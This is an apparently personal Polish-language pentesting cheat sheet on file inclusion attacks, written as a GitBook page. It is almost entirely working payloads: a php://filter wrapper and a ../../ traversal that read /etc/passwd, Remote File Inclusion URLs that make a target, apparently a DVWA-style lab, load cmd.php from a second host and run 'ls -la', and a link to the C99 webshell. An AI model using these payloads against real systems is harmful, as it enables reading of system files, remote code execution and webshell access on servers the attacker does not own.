---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Local File Inclusion, directory traversal, Remote File Inclusion

**LFI** skrypt się wykona

{% code fullWidth="true" %}
```python
127.0.0.1/rlfi.php?lanquage=php://filter/convert.base64-encode/resource=/etc/passwd&action=go
#a potem dekodujemy w burp suit decoder base64
```
{% endcode %}

**Directory traversal** czytamy bajt po bajcie, ale skrypt php czy inny się nie wykona

{% code fullWidth="true" %}
```python
127.0.0.1/directory_traversal_1.php?page=../../../../etc/passwd
```
{% endcode %}

**RFI**

{% code fullWidth="true" %}
```python
10.0.2.10/vulnerabilities/fi/?page=http://10.0.2.9:8000/phpinfo.php
10.0.2.10/vulnerabilities/fi/?page=http://10.0.2.9:8000/cmd.php&cmd=ls+-la
```
{% endcode %}

**WebShell**

[**https://github.com/cermmik/C99-WebShell/blob/master/c99shell.php**](https://github.com/cermmik/C99-WebShell/blob/master/c99shell.php)
